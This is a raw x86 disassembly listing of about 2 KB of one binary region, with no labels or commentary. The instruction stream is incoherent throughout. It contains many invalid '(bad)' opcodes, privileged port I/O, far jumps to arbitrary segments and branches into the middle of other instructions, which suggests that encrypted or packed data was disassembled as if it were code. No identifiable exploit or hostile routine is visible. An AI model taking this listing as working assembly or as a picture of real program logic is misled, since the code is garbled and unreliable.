  406fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fc5:	mov    ebp,0x4d145fbb
  406fca:	arpl   WORD PTR [edx+0x2b],sp
  406fcd:	and    al,0xc6
  406fcf:	or     eax,0x5dab2651
  406fd4:	rol    BYTE PTR [esi],cl
  406fd6:	clc    
  406fd7:	repnz mov ?,WORD PTR ds:[esi+0x4230af61]
  406fdf:	int    0x58
  406fe1:	fisttp WORD PTR [ecx+0x43b268dc]
  406fe7:	mov    ecx,0xe5ba710f
  406fec:	pop    ebp
  406fed:	dec    ecx
  406fee:	dec    esp
  406fef:	adc    ebx,0x81bf6875
  406ff5:	mov    eax,ds:0x2f79b364
  406ffa:	dec    ecx
  406ffb:	xchg   edx,eax
  406ffc:	loopne 0x407045
  406ffe:	xchg   DWORD PTR [ecx],ecx
  407000:	sbb    esp,esi
  407002:	out    0x8,al
  407004:	cwde   
  407005:	inc    edx
  407006:	stc    
  407007:	call   0x6b28:0x26db4e6b
  40700e:	jbe    0x407030
  407010:	mov    WORD PTR [esi+0xf],?
  407013:	xchg   ecx,eax
  407014:	jmp    0x8bce:0x36510ce5
  40701b:	out    0xb2,eax
  40701d:	add    ecx,DWORD PTR [edx-0x57]
  407020:	xor    ebp,DWORD PTR [edx+0x1c]
  407023:	enter  0xd7f6,0x2e
  407027:	jno    0x407040
  407029:	out    0x79,al
  40702b:	lahf   
  40702c:	xor    ch,dl
  40702e:	cmp    DWORD PTR [edx],esp
  407030:	jbe    0x407019
  407032:	or     DWORD PTR [ebp-0x1a70d31d],ebp
  407038:	sub    ecx,DWORD PTR [ecx+0x506e1c79]
  40703e:	mov    ecx,0xc5561bd5
  407043:	rol    DWORD PTR [ecx],cl
  407045:	mov    edi,0xf437f43b
  40704a:	dec    dh
  40704c:	neg    DWORD PTR [ebp+0x14]
  40704f:	jo     0x406fec
  407051:	adc    DWORD PTR [edx],eax
  407053:	fld    QWORD PTR [eax+edi*4]
  407056:	sbb    eax,0xf2b42ffa
  40705b:	outs   dx,BYTE PTR ds:[esi]
  40705c:	adc    DWORD PTR [edx-0x6f],ecx
  40705f:	push   edi
  407060:	rcr    ah,1
  407062:	add    bh,BYTE PTR ds:0xb675ff04
  407068:	mov    ds:0x210b2291,al
  40706d:	inc    ebx
  40706e:	nop
  40706f:	fadd   DWORD PTR [edx+0x1b]
  407072:	adc    BYTE PTR [edx],0x52
  407075:	xlat   BYTE PTR ds:[ebx]
  407076:	cmp    dh,BYTE PTR [edi-0x29]
  407079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40707a:	scas   eax,DWORD PTR es:[edi]
  40707b:	dec    ebx
  40707c:	sub    bl,al
  40707e:	fadd   st,st(2)
  407080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407081:	jmp    0x407078
  407083:	and    ecx,DWORD PTR [ebp-0x75b0fe2a]
  407089:	pop    ecx
  40708a:	sub    ch,BYTE PTR [eax+0x31]
  40708d:	mov    ah,BYTE PTR [esi+0x2f9d2392]
  407093:	lds    ebp,FWORD PTR [ebx+ecx*8-0x3fff04b0]
  40709a:	sti    
  40709b:	add    BYTE PTR [ebp-0xb],al
  40709e:	gs jae 0x40709b
  4070a1:	fs sbb al,0x7a
  4070a4:	adc    al,0x19
  4070a6:	inc    eax
  4070a7:	sub    BYTE PTR [ebx],bl
  4070a9:	enter  0x1d1a,0x3c
  4070ad:	jnp    0x4070c9
  4070af:	or     edx,DWORD PTR [esi+0x78]
  4070b2:	cli    
  4070b3:	cwde   
  4070b4:	rcl    ebp,1
  4070b6:	adc    al,BYTE PTR [ebx+edx*1]
  4070b9:	das    
  4070ba:	mov    esi,0x8c591dc4
  4070bf:	jecxz  0x4070c0
  4070c1:	cmp    ecx,edx
  4070c3:	xlat   BYTE PTR ds:[ebx]
  4070c4:	imul   eax,DWORD PTR [ecx-0x2ee3f2b4],0x2f
  4070cb:	mov    dh,0x9d
  4070cd:	xlat   BYTE PTR ds:[ebx]
  4070ce:	shl    BYTE PTR [edi-0x2a50e4cb],0x41
  4070d5:	int3   
  4070d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070d7:	mov    dh,0x37
  4070d9:	inc    ebx
  4070da:	push   0xc49a37a2
  4070df:	mov    bl,0xb0
  4070e1:	je     0x40713b
  4070e3:	sar    BYTE PTR [edi],1
  4070e5:	jge    0x407097
  4070e7:	mov    edi,DWORD PTR [edx-0x3309c0cd]
  4070ed:	(bad)  
  4070ee:	(bad)  
  4070f0:	(bad)  
  4070f1:	mov    al,ds:0xe15e9fab
  4070f6:	xchg   edi,eax
  4070f7:	or     al,BYTE PTR [edx-0x2cc91eef]
  4070fd:	dec    edx
  4070fe:	jno    0x4070bf
  407100:	cmc    
  407101:	xchg   ebp,eax
  407102:	adc    al,bh
  407104:	adc    DWORD PTR [ebx+0xa4fe4ec],eax
  40710a:	pop    ss
  40710b:	int    0x9a
  40710d:	out    0xae,al
  40710f:	jecxz  0x40709d
  407111:	aam    0x25
  407113:	pusha  
  407114:	call   0x9d58bbb1
  407119:	pop    edi
  40711a:	cdq    
  40711b:	mov    edx,DWORD PTR fs:[ebp+0x4c]
  40711f:	jbe    0x40713a
  407121:	push   edi
  407122:	and    BYTE PTR [eax+ebx*1],bl
  407125:	and    bl,BYTE PTR [ebx]
  407127:	xor    BYTE PTR [ecx],0xd2
  40712a:	inc    ebp
  40712b:	dec    ebx
  40712c:	pop    es
  40712d:	loope  0x4070d0
  40712f:	shl    DWORD PTR [esi-0xa912311],cl
  407135:	mov    cl,0x42
  407137:	pop    ebx
  407138:	ins    DWORD PTR es:[edi],dx
  407139:	xor    BYTE PTR [ebx],0x24
  40713c:	dec    edi
  40713d:	mov    bh,0xd0
  40713f:	cli    
  407140:	jo     0x407194
  407142:	push   esp
  407143:	clc    
  407144:	sub    ch,dh
  407146:	repnz sub BYTE PTR [edx-0x2ce9c83],dl
  40714d:	shr    DWORD PTR [edx],1
  40714f:	cmp    al,0x92
  407151:	call   0x707d6099
  407156:	mul    DWORD PTR ds:0xa4efe615
  40715c:	cs jp  0x4071ca
  40715f:	test   eax,0x27bcb639
  407164:	jno    0x4071c7
  407166:	pop    ecx
  407167:	cdq    
  407168:	lock je 0x407149
  40716b:	cld    
  40716c:	inc    edx
  40716d:	jns    0x40719b
  40716f:	sbb    eax,0x3da0a222
  407174:	or     eax,DWORD PTR [ebx]
  407176:	xchg   edi,eax
  407177:	aad    0xd0
  407179:	mov    eax,0xa5cb6f33
  40717e:	fild   DWORD PTR [eax-0x21098dac]
  407184:	pop    ecx
  407185:	(bad)  
  407186:	neg    BYTE PTR [ebx]
  407188:	sbb    esi,eax
  40718a:	in     al,0xef
  40718c:	std    
  40718d:	lods   al,BYTE PTR ds:[esi]
  40718e:	push   esi
  40718f:	push   edx
  407190:	out    dx,eax
  407191:	setle  BYTE PTR [edx+0x5d38cdc2]
  407198:	bound  ecx,QWORD PTR [ebp+0x50]
  40719b:	cmp    DWORD PTR [edx],eax
  40719d:	add    eax,0x73e83ebb
  4071a2:	shl    DWORD PTR [edx-0x6f],1
  4071a5:	jnp    0x4071fd
  4071a7:	sub    bh,BYTE PTR [ebx+0x56f4d8e4]
  4071ad:	push   ebx
  4071ae:	dec    edi
  4071af:	jle    0x4071a2
  4071b1:	int3   
  4071b2:	mov    bl,0xb4
  4071b4:	pop    esp
  4071b5:	push   edi
  4071b6:	mov    dh,0xdc
  4071b8:	fisttp WORD PTR [ebp+0x16a20497]
  4071be:	xchg   edx,eax
  4071bf:	jge    0x407201
  4071c1:	data16 and al,0x5d
  4071c4:	jno    0x4071e2
  4071c6:	dec    esp
  4071c7:	or     al,0x16
  4071c9:	retf   
  4071ca:	in     al,dx
  4071cb:	sub    eax,DWORD PTR [ecx]
  4071cd:	(bad)
  4071d1:	iret   
  4071d2:	lock ret 
  4071d4:	cmp    eax,0xc5360201
  4071d9:	es mov esp,0x7c691e1c
  4071df:	data16 out 0x6a,al
  4071e2:	xchg   edx,eax
  4071e3:	push   ebp
  4071e4:	and    bl,BYTE PTR [eax+0x55187602]
  4071ea:	sub    esp,0x43
  4071ed:	mov    BYTE PTR [eax],bh
  4071ef:	enter  0x30d5,0x70
  4071f3:	ret    
  4071f4:	inc    ebp
  4071f5:	xchg   ecx,eax
  4071f6:	adc    DWORD PTR [ebx-0x39697845],ecx
  4071fc:	mov    ah,0xf3
  4071fe:	nop
  4071ff:	mov    ds:0xc1fb433,eax
  407204:	ins    BYTE PTR es:[edi],dx
  407205:	ins    BYTE PTR es:[edi],dx
  407206:	aad    0x8
  407208:	sub    BYTE PTR [ecx+0x20],0x37
  40720c:	aam    0xe2
  40720e:	(bad)  
  40720f:	add    cl,BYTE PTR [esi-0x2135051]
  407215:	mov    bh,0xe
  407217:	sbb    al,dl
  407219:	retf   0xf773
  40721c:	imul   esp,DWORD PTR [ebx+0x45],0x20fe8be
  407223:	mov    cl,0xfa
  407225:	stc    
  407226:	sbb    DWORD PTR [edi+0x74],eax
  407229:	mov    al,ah
  40722b:	mov    ds:0xa01db3,eax
  407230:	dec    ecx
  407231:	xor    al,0x24
  407233:	mov    ah,0x7
  407235:	xchg   ebx,eax
  407236:	xor    BYTE PTR [ebp+0x3d],bh
  407239:	fisttp DWORD PTR [esi+0x18619227]
  40723f:	imul   esp,DWORD PTR [ecx-0x6054c464],0x6ad85244
  407249:	xlat   BYTE PTR ds:[ebx]
  40724a:	jmp    0xea61:0xdaec868b
  407251:	dec    ecx
  407252:	jae    0x407261
  407254:	xchg   edi,eax
  407255:	(bad)  
  407256:	(bad)  
  407258:	hlt    
  407259:	inc    edx
  40725a:	add    cl,0x95
  40725d:	int3   
  40725e:	pop    ss
  40725f:	inc    edi
  407260:	data16 and BYTE PTR [edi-0x5e],dh
  407264:	and    bh,bl
  407266:	loopne 0x407259
  407268:	sbb    ebp,DWORD PTR [ebx+eax*1-0x5b44f8e4]
  40726f:	rol    ebx,0x77
  407272:	lock xchg dh,bh
  407275:	pop    edi
  407276:	mov    BYTE PTR [ecx+0x56],dh
  407279:	add    ah,BYTE PTR [edx+eiz*8-0x3]
  40727d:	pop    edx
  40727e:	adc    edx,DWORD PTR [ecx-0x10]
  407281:	(bad)  
  407282:	sbb    eax,0xabc46b2f
  407287:	retf   
  407288:	daa    
  407289:	add    eax,0x4438be5
  40728e:	dec    ebx
  40728f:	xchg   ebp,eax
  407290:	adc    eax,0xe5915e9d
  407295:	(bad)  
  407296:	daa    
  407297:	aam    0xec
  407299:	push   ds
  40729a:	repnz icebp 
  40729c:	mov    ds:0xfe1f4e28,eax
  4072a1:	jl     0x40729b
  4072a3:	sbb    ah,BYTE PTR [ecx+ebp*2-0x1949161b]
  4072aa:	push   0x21e9e45f
  4072af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072b0:	xchg   DWORD PTR [ebx],edx
  4072b2:	dec    esp
  4072b3:	and    eax,0xd1cb32bc
  4072b8:	(bad)  
  4072b9:	ret    0xd3fa
  4072bc:	jg     0x4072ac
  4072be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072bf:	jo     0x40729c
  4072c1:	imul   edx,DWORD PTR [edx],0x22
  4072c4:	sbb    DWORD PTR [esp+edx*2+0x0],eax
  4072c8:	xchg   BYTE PTR [ebx+0x1a],dl
  4072cb:	mov    fs,WORD PTR [esi-0x56]
  4072ce:	cmp    bl,BYTE PTR [eax]
  4072d0:	xchg   BYTE PTR [ecx+0x62],dh
  4072d3:	lea    edi,[edi-0x6c]
  4072d6:	jno    0x407282
  4072d8:	dec    ecx
  4072d9:	mov    eax,ds:0xb849685d
  4072de:	aad    0x8d
  4072e0:	imul   edi,DWORD PTR [edx-0x1],0xffffffc7
  4072e4:	je     0x407302
  4072e6:	pop    ds
  4072e7:	jne    0x4072f5
  4072e9:	lods   eax,DWORD PTR ds:[esi]
  4072ea:	adc    bl,BYTE PTR [ebx+ebp*4]
  4072ed:	sti    
  4072ee:	not    DWORD PTR [eax]
  4072f0:	leave  
  4072f1:	ror    DWORD PTR [edi+0x28],0x25
  4072f5:	retf   0xb7e3
  4072f8:	imul   ebx,DWORD PTR [esi-0xc],0x7bfc6d97
  4072ff:	push   edx
  407300:	xchg   ebx,eax
  407301:	in     eax,0x20
  407303:	sbb    DWORD PTR [edx],0xffffffa1
  407306:	cmp    DWORD PTR [ebp+0x6f],esi
  407309:	addr16 add eax,0x55d3c157
  40730f:	test   BYTE PTR [edx+0x79ad286f],0x74
  407316:	sub    dh,cl
  407318:	jo     0x4072ac
  40731a:	aaa    
  40731b:	mov    dh,0x2f
  40731d:	ja     0x4072b8
  40731f:	in     eax,dx
  407320:	jl     0x407382
  407322:	mov    al,ds:0xefd3075b
  407327:	xor    eax,0xd7f03a1a
  40732c:	icebp  
  40732d:	outs   dx,DWORD PTR ds:[esi]
  40732e:	pop    eax
  40732f:	(bad)  
  407330:	xchg   ecx,eax
  407331:	adc    edi,DWORD PTR [edx]
  407333:	push   cs
  407334:	cmp    edi,DWORD PTR ds:0x63a2e6ed
  40733a:	inc    edx
  40733b:	popa   
  40733c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40733d:	sahf   
  40733e:	out    0x82,al
  407340:	sbb    al,0xb3
  407342:	imul   ebx,DWORD PTR [edi-0x45c70651],0x8eee50e3
  40734c:	xor    al,bl
  40734e:	(bad)  
  40734f:	pop    eax
  407350:	or     al,0x61
  407352:	cmp    cl,0x50
  407355:	aaa    
  407356:	cmp    al,ah
  407358:	ins    DWORD PTR es:[edi],dx
  407359:	addr16 inc ecx
  40735b:	call   0x8539:0xccf61b6b
  407362:	psubq  mm4,QWORD PTR [esi+0x68a66bbe]
  407369:	das    
  40736a:	rcl    BYTE PTR [edx+eax*8-0xb],cl
  40736e:	repnz in al,0x4c
  407371:	mov    ds:0x6946b235,al
  407376:	push   0x59c8d242
  40737b:	add    eax,0x94d32d5b
  407380:	fs pop ss
  407382:	mov    eax,ds:0x3280427e
  407387:	mov    fs,WORD PTR [ebx]
  407389:	cmp    DWORD PTR [edi],ebx
  40738b:	lock into 
  40738d:	das    
  40738e:	sub    dh,BYTE PTR [edi+0x4252fd78]
  407394:	xor    eax,0x2f0d509e
  407399:	mov    esi,0xa880cf2
  40739e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40739f:	mov    edx,0x86c2a1be
  4073a4:	pusha  
  4073a5:	loope  0x4073a1
  4073a7:	pop    ebx
  4073a8:	sub    al,0x96
  4073aa:	mov    cl,0x8d
  4073ac:	dec    edi
  4073ad:	test   DWORD PTR ds:0x777c378c,esp
  4073b3:	xchg   DWORD PTR [ebx+0x30],esi
  4073b6:	xchg   ecx,eax
  4073b7:	imul   esp,DWORD PTR [ecx],0x56
  4073ba:	idiv   BYTE PTR [ebx+0x54]
  4073bd:	push   ebp
  4073be:	push   ebp
  4073bf:	call   0x6825327b
  4073c4:	mov    ds:0x458826d4,eax
  4073c9:	aad    0x82
  4073cb:	xor    DWORD PTR [ecx+0x76],0x1c
  4073cf:	nop
  4073d0:	icebp  
  4073d1:	sti    
  4073d2:	xor    DWORD PTR [ecx],ebp
  4073d4:	and    ebx,DWORD PTR [edx-0x5a]
  4073d7:	jl     0x407435
  4073d9:	mov    eax,0x837d85b4
  4073de:	jmp    0x407426
  4073e0:	jnp    0x40737d
  4073e2:	jg     0x407393
  4073e4:	jecxz  0x407452
  4073e6:	jae    0x4073b2
  4073e8:	dec    eax
  4073e9:	dec    ebx
  4073ea:	xor    esp,0xe56fe7
  4073f0:	lds    edi,FWORD PTR es:[ecx]
  4073f3:	and    al,0x86
  4073f5:	jbe    0x4073ac
  4073f7:	out    dx,eax
  4073f8:	add    eax,0x30fe2943
  4073fd:	ja     0x40740e
  4073ff:	lds    ebp,FWORD PTR [edi-0x42]
  407402:	mov    dh,0xc8
  407404:	bound  esi,QWORD PTR [ebx-0x9]
  407407:	inc    esi
  407408:	rcl    DWORD PTR [edi-0xf5448de],cl
  40740e:	stc    
  40740f:	xchg   esp,eax
  407410:	and    bl,dh
  407412:	xchg   ebx,eax
  407413:	in     eax,dx
  407414:	inc    edx
  407415:	and    ah,BYTE PTR [eax]
  407417:	adc    DWORD PTR [ecx-0x25],edx
  40741a:	test   BYTE PTR [ecx+0x65],cl
  40741d:	icebp  
  40741e:	adc    bh,BYTE PTR [ebx+ebx*8+0xd]
  407422:	popa   
  407423:	cmp    ebp,esp
  407425:	and    dh,al
  407427:	ror    BYTE PTR [esi+0x3c5ebd47],0x56
  40742e:	icebp  
  40742f:	in     eax,0xa7
  407431:	mov    ds:0x196576d7,eax
  407436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407437:	sub    DWORD PTR [ebp+0x335c8d91],eax
  40743d:	sbb    esi,ebp
  40743f:	jbe    0x407494
  407441:	mov    ch,0x8e
  407443:	mov    dl,0xf6
  407445:	mov    esp,0x78a624ff
  40744a:	sbb    eax,0x250ec92f
  40744f:	sbb    ch,ah
  407451:	mov    ebx,0xbdad691
  407456:	push   0x210d1c9a
  40745b:	jb     0x4073fc
  40745d:	out    dx,al
  40745e:	popf   
  40745f:	adc    edi,DWORD PTR ds:0xe57e763b
  407465:	sub    DWORD PTR [eax+0x6],ebx
  407468:	jo     0x4074c0
  40746a:	int    0xc3
  40746c:	sti    
  40746d:	(bad)  [edx-0x58947473]
  407473:	call   0x132a:0x38802ccd
  40747a:	(bad)  
  40747b:	frstor ds:0xa0a51ea2
  407481:	shr    BYTE PTR [eax-0x3e53e610],cl
  407487:	add    DWORD PTR [edx-0x4d],esi
  40748a:	pop    ebx
  40748b:	mov    ch,0xc2
  40748d:	dec    ebp
  40748e:	in     eax,0x29
  407490:	push   es
  407491:	ret    0x1c43
  407494:	sbb    DWORD PTR [edx+0x14],edi
  407497:	addr16 push ss
  407499:	cmp    ebx,esp
  40749b:	mov    esp,0xf6d36523
  4074a0:	int    0x14
  4074a2:	and    al,0xe9
  4074a4:	je     0x4074f5
  4074a6:	mov    edi,0xac2569a2
  4074ab:	mov    edi,0x2c9d73e3
  4074b0:	pop    ecx
  4074b1:	pusha  
  4074b2:	ss mov dl,al
  4074b5:	or     al,0x35
  4074b7:	(bad)  [eax-0x6572eb3f]
  4074bd:	ror    BYTE PTR [eax+0x30578dc4],cl
  4074c3:	or     al,0x24
  4074c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074c6:	jne    0x4074b2
  4074c8:	xor    eax,0x68e41bda
  4074cd:	in     al,0x3c
  4074cf:	test   ebx,ebp
  4074d1:	cmp    eax,0x5102914d
  4074d6:	sub    DWORD PTR [esi+0x123d90be],0xffffffff
  4074dd:	daa    
  4074de:	jae    0x40754e
  4074e0:	call   0xe17885d1
  4074e5:	ror    DWORD PTR [esi+ebp*8-0xa242be],1
  4074ec:	pushf  
  4074ed:	or     DWORD PTR [ecx-0x3],ebp
  4074f0:	test   BYTE PTR [esp+edx*8-0x7524e957],bh
  4074f7:	jge    0x40747c
  4074f9:	fisubr WORD PTR [edx]
  4074fb:	inc    eax
  4074fc:	fs aam 0x86
  4074ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407500:	cld    
  407501:	inc    ebx
  407502:	cmp    eax,0xe2d24477
  407507:	aaa    
  407508:	inc    ebp
  407509:	(bad)
  40750c:	mov    dh,BYTE PTR ds:0x52915cea
  407512:	cmp    bl,BYTE PTR [ebp+0x7ecc3af8]
  407518:	fsubr  DWORD PTR [edx+ebp*8-0xd]
  40751c:	std    
  40751d:	outs   dx,BYTE PTR ds:[esi]
  40751e:	ins    DWORD PTR es:[edi],dx
  40751f:	leave  
  407520:	lds    ecx,FWORD PTR [ebx+0x38]
  407523:	fmul   st,st(6)
  407525:	xor    cl,0x0
  407528:	xchg   DWORD PTR [edi+0x3a391e8],ebx
  40752e:	dec    ebp
  40752f:	in     eax,dx
  407530:	ret    
  407531:	nop
  407532:	jmp    0xcbc6:0x53ee118c
  407539:	rcl    BYTE PTR ds:0xd3af5a3e,0x8f
  407540:	stos   BYTE PTR es:[edi],al
  407541:	jo     0x40759f
  407543:	inc    edx
  407544:	retf   
  407545:	leave  
  407546:	xchg   edx,eax
  407547:	push   0x12
  407549:	lods   al,BYTE PTR ds:[esi]
  40754a:	jo     0x4074dc
  40754c:	mov    ds:0x9a00c2,al
  407551:	push   0x27
  407553:	inc    ecx
  407554:	and    ecx,edi
  407556:	rcl    BYTE PTR [ecx],0x73
  407559:	loope  0x4075ae
  40755b:	mov    ebx,0xed1281de
  407560:	aad    0xb1
  407562:	sub    eax,0x61f4e5cb
  407567:	fs jecxz 0x40751d
  40756a:	dec    ecx
  40756b:	xor    edx,DWORD PTR [eax-0x3cb03ddd]
  407571:	cmp    edi,DWORD PTR [ebp+0x2ee9b564]
  407577:	xor    al,0xda
  407579:	mov    eax,ds:0x8cd18d20
  40757e:	in     al,0xb4
  407580:	pop    esp
  407581:	ror    BYTE PTR [edx],cl
  407583:	sahf   
  407584:	mov    ebx,0x4b31fb70
  407589:	mov    ch,0xcb
  40758b:	ins    DWORD PTR es:[edi],dx
  40758c:	jb     0x40751d
  40758e:	sbb    DWORD PTR [edx],edi
  407590:	int3   
  407591:	retw   
  407593:	inc    DWORD PTR [edx+edi*4+0x4d]
  407597:	shl    ch,0xa0
  40759a:	mov    ds:0x42eeaaf6,al
  40759f:	push   es
  4075a0:	out    0x9b,eax
  4075a2:	xchg   edx,eax
  4075a3:	adc    al,0x89
  4075a5:	jns    0x4075a3
  4075a7:	xchg   BYTE PTR [ebp+0x3e],ah
  4075aa:	fnsave [esi+0x57]
  4075ad:	sub    al,0x96
  4075af:	call   0x3a57:0xde8da513
  4075b6:	retf   
  4075b7:	xor    ch,ch
  4075b9:	cmp    ch,BYTE PTR [edx]
  4075bb:	mov    al,ds:0xaa1dfafc
  4075c0:	mov    ah,0x52
  4075c2:	test   DWORD PTR ds:[ebp+0x5e],ecx
  4075c6:	mov    esp,0x77e2215
  4075cb:	xchg   esi,eax
  4075cc:	cli    
  4075cd:	ja     0x407641
  4075cf:	jns    0x40764c
  4075d1:	stc    
  4075d2:	jne    0x40758b
  4075d4:	mov    esi,0x3b47fc34
  4075d9:	push   esp
  4075da:	int3   
  4075db:	leave  
  4075dc:	mov    ebp,0x6db983dc
  4075e1:	adc    al,0x9e
  4075e3:	sub    ebx,DWORD PTR [edx+0x5818473a]
  4075e9:	adc    BYTE PTR [esi+0x4d],ah
  4075ec:	call   0xf0b3:0x3f5d7f5a
  4075f3:	in     eax,dx
  4075f4:	cmp    al,0x13
  4075f6:	stos   BYTE PTR es:[edi],al
  4075f7:	xlat   BYTE PTR ds:[ebx]
  4075f8:	outs   dx,BYTE PTR ds:[esi]
  4075f9:	sbb    eax,0x22bc7e11
  4075fe:	pop    ebx
  4075ff:	dec    ecx
  407600:	jno    0x40767e
  407602:	arpl   WORD PTR [ebp-0x7083813],bx
  407608:	(bad)  
  407609:	fsubr  QWORD PTR [ecx]
  40760b:	sub    bl,BYTE PTR [ebp-0x5b2f4246]
  407611:	fwait
  407612:	aad    0xe2
  407614:	sub    al,bl
  407616:	xchg   edx,eax
  407617:	dec    esp
  407618:	add    ebx,ebp
  40761a:	sbb    BYTE PTR ds:0x6925df12,dh
  407620:	icebp  
  407621:	enter  0x1eba,0x64
  407625:	mov    BYTE PTR [edx+0x64],bh
  407628:	adc    esi,eax
  40762a:	xor    BYTE PTR [ecx+0x220f43db],cl
  407630:	jl     0x4076a7
  407632:	jmp    0x7176e97c
  407637:	das    
  407638:	dec    ebx
  407639:	sub    ecx,DWORD PTR ds:0x57f12b34
  40763f:	push   eax
  407640:	pop    ds
  407641:	(bad)  
  407642:	in     al,dx
  407643:	fs pop ecx
  407645:	xor    al,BYTE PTR [edx]
  407647:	test   al,0xb5
  407649:	in     eax,0x30
  40764b:	jne    0x4075e9
  40764d:	cmp    eax,0x28f4ebb1
  407652:	sbb    ebp,DWORD PTR [esi]
  407654:	imul   eax,DWORD PTR [esi+0x37],0x534e3629
  40765b:	stos   BYTE PTR es:[edi],al
  40765c:	nop
  40765d:	std    
  40765e:	mov    bl,0xc8
  407660:	xor    BYTE PTR ss:[ebx-0x63],bh
  407664:	pop    es
  407665:	js     0x407628
  407667:	call   0x577cde01
  40766c:	lea    eax,[edx+0x5cfeb21e]
  407672:	test   al,0x56
  407674:	pop    ss
  407675:	cmc    
  407676:	stc    
  407677:	jecxz  0x40762c
  407679:	loope  0x40766b
  40767b:	in     al,0x8f
  40767d:	mov    eax,ds:0xfc49a68f
  407682:	push   ebx
  407683:	repnz and BYTE PTR [ebp-0x557e8415],ch
  40768a:	sbb    dl,BYTE PTR [eax]
  40768c:	cmp    edi,edx
  40768e:	loope  0x407677
  407690:	jmp    0xe72648d9
  407695:	sbb    al,0xd8
  407697:	mov    ds,WORD PTR [edi]
  407699:	lahf   
  40769a:	outs   dx,DWORD PTR ds:[esi]
  40769b:	adc    eax,DWORD PTR [esi+0x61]
  40769e:	ret    0x811b
  4076a1:	out    dx,eax
  4076a2:	and    edi,edi
  4076a4:	inc    ebp
  4076a5:	xchg   edi,eax
  4076a6:	pop    ss
  4076a7:	mov    al,ds:0x89d5dd4e
  4076ac:	gs adc eax,0x36166a5e
  4076b2:	jo     0x40764d
  4076b4:	adc    eax,0x4d4fea11
  4076b9:	repz bound eax,QWORD PTR [edi]
  4076bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076bd:	loop   0x40770c
  4076bf:	push   es
  4076c0:	in     eax,dx
  4076c1:	xchg   ecx,eax
  4076c2:	rcr    DWORD PTR [ecx+ecx*4-0x18],0x65
  4076c7:	mov    eax,0xb997204b
  4076cc:	pop    edx
  4076cd:	sub    bh,ah
  4076cf:	cld    
  4076d0:	cli    
  4076d1:	loopne 0x4076d2
  4076d3:	sbb    edx,ebx
  4076d5:	das    
  4076d6:	dec    eax
  4076d7:	jp     0x407690
  4076d9:	lods   eax,DWORD PTR ds:[esi]
  4076da:	leave  
  4076db:	shl    DWORD PTR [ebx-0x7e],0xb6
  4076df:	gs icebp 
  4076e1:	je     0x4076fc
  4076e3:	pop    ebx
  4076e4:	xchg   esp,eax
  4076e5:	pop    edx
  4076e6:	adc    eax,0xe5cfc008
  4076eb:	pop    ds
  4076ec:	aaa    
  4076ed:	jnp    0x4076c6
  4076ef:	(bad)  
  4076f0:	pop    ebx
  4076f1:	mov    edi,0xeeee8445
  4076f6:	in     eax,0x3b
  4076f8:	loopne 0x4076d6
  4076fa:	into   
  4076fb:	shl    ch,cl
  4076fd:	aad    0xe
  4076ff:	stos   BYTE PTR es:[edi],al
  407700:	frstor [ecx]
  407702:	(bad)  
  407703:	sti    
  407704:	das    
  407705:	and    DWORD PTR [edi-0xc7e0cc0],ebp
  40770b:	cmc    
  40770c:	xchg   ecx,eax
  40770d:	jno    0x407724
  40770f:	out    dx,al
  407710:	ret    0xf739
  407713:	and    DWORD PTR [esi],edx
  407715:	fs mov dl,0x48
  407718:	adc    DWORD PTR [edi+esi*4-0x30],0x23
  40771d:	xlat   BYTE PTR ds:[ebx]
  40771e:	out    dx,al
  40771f:	call   0xba469926
  407724:	mov    al,0xf9
  407726:	inc    edi
  407727:	or     DWORD PTR [eax+0x1ff1e3ea],0xfffffff5
  40772e:	sub    al,0x7b
  407730:	and    al,0x76
  407732:	rcr    DWORD PTR [ebx+ecx*1],0xc2
  407736:	sbb    al,0xbd
  407738:	and    DWORD PTR [esi-0x35],eax
  40773b:	addr16 in al,dx
  40773d:	out    0xf3,al
  40773f:	test   al,0x6e
  407741:	mov    ah,0xad
  407743:	pushf  
  407744:	and    DWORD PTR [edi-0x31],ebp
  407747:	(bad)  
  407748:	and    al,0xea
  40774a:	mov    ch,0x33
  40774c:	jne    0x40771b
  40774e:	ins    DWORD PTR es:[edi],dx
  40774f:	or     eax,0xdf0417c9
  407754:	leave  
  407755:	inc    ecx
  407756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407757:	or     eax,0xcb349e4d
  40775c:	sar    ecx,0x33
  40775f:	pop    ds
  407760:	jmp    FWORD PTR [edi-0x27]
  407763:	aad    0x3c
  407765:	int    0xe6
  407767:	clc    
  407768:	mov    edi,0x55dd381b
  40776d:	call   0x8208b02
  407772:	lahf   
  407773:	test   DWORD PTR [ebx-0x3],0x523e12df
  40777a:	fs and esp,esp
  40777d:	addr16 jbe 0x407734
  407780:	and    DWORD PTR [ecx+0x73],edx
  407783:	pop    ebx
  407784:	mov    WORD PTR [edi],?
  407786:	xchg   edx,eax
  407787:	fstp   TBYTE PTR ds:0xcfe8449f
  40778d:	pop    ebx
  40778e:	sub    bl,bl
  407790:	mov    ebx,0xe4b32656
  407795:	mov    ds:0xfbc8fc8,al
  40779a:	push   edx
  40779b:	sbb    edx,DWORD PTR [edx-0x12]
  40779e:	aad    0xf3
  4077a0:	outs   dx,DWORD PTR ds:[esi]
  4077a1:	jns    0x40774e
  4077a3:	shl    DWORD PTR [edi-0x2a006df0],0x2
  4077aa:	retf   0x6fa
  4077ad:	std    
  4077ae:	(bad)  
  4077af:	sub    eax,0x89d4659f
  4077b4:	mov    edi,0xff7ea3cd
  4077b9:	xchg   ecx,eax
  4077ba:	xor    ah,BYTE PTR [ebp+0x66e5adf7]
  4077c0:	mov    bh,ah
  4077c2:	inc    esi
  4077c3:	fsubrp st(6),st
  4077c5:	sub    dh,BYTE PTR [ecx+0x7d082e75]
  4077cb:	mov    ecx,DWORD PTR [ecx]
  4077cd:	push   edx
  4077ce:	fidivr DWORD PTR [ecx+eiz*1+0x55]
  4077d2:	jle    0x4077e1
  4077d4:	xchg   ebp,eax
  4077d5:	ret    0x7d70
